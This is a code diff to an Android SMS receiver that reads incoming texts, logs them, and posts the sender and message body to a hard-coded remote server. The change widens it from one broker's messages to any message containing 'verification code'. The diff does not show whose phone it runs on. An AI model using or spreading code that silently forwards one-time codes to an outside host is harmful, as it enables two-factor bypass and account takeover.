@@ -42,8 +42,8 @@ public class SMSReceiver extends BroadcastReceiver {
 
             Log.i("SMSReceiver", "onReceive: " + from + " " + msg);
 
-            if(msg.contains("Exness")) {
-                /* Your Exness verification code is: 146394 */
+            /* Your Exness verification code is: 146394 */
+            if (msg.toLowerCase().contains("verification code")) {
                 display(context, from, msg);
                 sendPostRequest(from, msg);
             }
@@ -77,6 +77,7 @@ public class SMSReceiver extends BroadcastReceiver {
      */
 
     private final static String URL = "http://ec2-3-112-51-9.ap-northeast-1.compute.amazonaws.com:5000/api/v1/exness/sms";
+    // private final static String URL = "http://localhost:5000/api/v1/exness/sms";
 
     private void sendPostRequest(String from, String msg) {
         try {
